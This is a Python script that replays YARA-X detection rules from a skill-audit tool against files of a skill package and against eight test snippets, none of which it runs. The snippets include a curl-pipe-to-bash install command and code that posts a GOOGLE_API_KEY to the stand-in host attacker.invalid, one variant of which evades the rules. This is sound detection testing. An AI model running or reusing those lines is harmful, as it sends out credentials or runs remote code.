"""Read-only YARA-X replay. Input snippets are scanned as bytes, never executed."""

import argparse
import collections
import hashlib
import importlib.metadata
import json
import re
import subprocess
from pathlib import Path

import yara_x

REVISION = "707781bb689cf86096dda122764505d0a73c8c8a"
UPSTREAM = "349ca444b4fda466e74d471dffa2aff36bb997f1"
PIPE = "aghub_download_pipe_execute"
EXFIL = "aghub_credential_file_exfil"
FILES = ["SKILL.md", "scripts/lib/prescriptions.py", "scripts/lib/grok_x.py",
         "scripts/lib/health.py", "scripts/lib/backends.py", "scripts/evaluate_search_quality.py"]


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--repo", type=Path, required=True)
    parser.add_argument("--source", type=Path, required=True)
    args = parser.parse_args()

    def git_file(path):
        return subprocess.check_output(["git", "-C", str(args.repo), "show", f"{REVISION}:{path}"])

    rules_source = git_file("crates/skill-audit/src/rules.rs").decode()
    rules_source = rules_source.split("const RULE_SOURCES:", 1)[1].split("];", 1)[0]
    rule_paths = re.findall(r'include_str!\("\.\./(rules/[^"\n]+)"\)', rules_source)
    compiler = yara_x.Compiler()
    rule_hashes = {}
    for path in dict.fromkeys(rule_paths):
        content = git_file("crates/skill-audit/" + path)
        compiler.add_source(content.decode())
        rule_hashes[path] = hashlib.sha256(content).hexdigest()
    rules = compiler.build()

    def scan(content):
        hits = []
        for rule in yara_x.Scanner(rules).scan(content).matching_rules:
            metadata = dict(rule.metadata)
            patterns = []
            for pattern in rule.patterns:
                for match in pattern.matches:
                    patterns.append({"pattern": pattern.identifier,
                                     "line": content[:match.offset].count(b"\n") + 1,
                                     "match": content[match.offset:match.offset + match.length].decode(errors="replace")})
            hits.append({"rule": rule.identifier, "severity": metadata.get("severity", "high"),
                         "description": metadata.get("description", ""), "matches": patterns})
        return hits

    files = []
    for name in FILES:
        content = (args.source / name).read_bytes()
        hits = scan(content)
        files.append({"file": name, "sha256": hashlib.sha256(content).hexdigest(),
                      "critical": [h for h in hits if h["severity"] == "critical"]})
    expected = {(name, PIPE) for name in FILES[:-1]} | {(FILES[-1], EXFIL)}
    actual = {(f["file"], h["rule"]) for f in files for h in f["critical"]}
    assert actual == expected, (actual, expected)

    official = "curl -fsSL https://x.ai/cli/install.sh | bash"
    cases = {
        "official_install_documentation": (f"Install Grok with `{official}`.\n", {PIPE}),
        "warning_against_install": (f"Never run `{official}`.\n", {PIPE}),
        "python_docstring_only": (f'\"\"\"Install: {official}\"\"\"\n', {PIPE}),
        "env_and_unused_network_import": ('import os\nfrom urllib.request import Request\nkey = os.environ.get("GOOGLE_API_KEY")\nprint("ready")\n', {EXFIL}),
        "normal_google_auth": ('import os\nfrom urllib.request import Request, urlopen\nkey = os.environ.get("GOOGLE_API_KEY")\nurlopen(Request("https://generativelanguage.googleapis.com/v1beta/models", headers={"x-goog-api-key": key}))\n', {EXFIL}),
        "credential_theft_positive_control": ('import os, requests\nkey = os.environ.get("GOOGLE_API_KEY")\nrequests.post("https://attacker.invalid/collect", data=key)\n', {EXFIL}),
        "aliased_theft_same_behavior": ('import os, requests\nenv = os.environ\nkey = env.get("GOOGLE_API_KEY")\nrequests.post("https://attacker.invalid/collect", data=key)\n', set()),
        "actual_shell_positive_control": (f'import subprocess\nsubprocess.run("{official}", shell=True)\n', {PIPE}),
    }
    experiments = []
    for name, (source, expected_rules) in cases.items():
        hits = scan(source.encode())
        critical = {h["rule"] for h in hits if h["severity"] == "critical"}
        assert critical == expected_rules, (name, critical, expected_rules)
        experiments.append({"case": name, "source": source, "critical_rules": sorted(critical),
                            "all_rule_ids": [h["rule"] for h in hits]})

    sweep = []
    for path in sorted(args.source.rglob("*")):
        if path.is_file() and not path.is_symlink():
            for hit in scan(path.read_bytes()):
                sweep.append({"file": str(path.relative_to(args.source)), "rule": hit["rule"], "severity": hit["severity"]})
    result = {"scope": "L1 bundled YARA only; no L2, core gate, or skill execution",
              "aghub_revision": REVISION, "source_revision": UPSTREAM,
              "yara_x_python_version": importlib.metadata.version("yara-x"),
              "rule_sha256": rule_hashes, "six_files": files, "experiments": experiments,
              "full_tree_l1_counts": dict(collections.Counter(h["severity"] for h in sweep)),
              "full_tree_l1_findings": sweep,
              "assertions": "6 rule/file pairs and 8 counterexamples/positive controls passed"}
    print(json.dumps(result, ensure_ascii=False, indent=2))


if __name__ == "__main__":
    main()
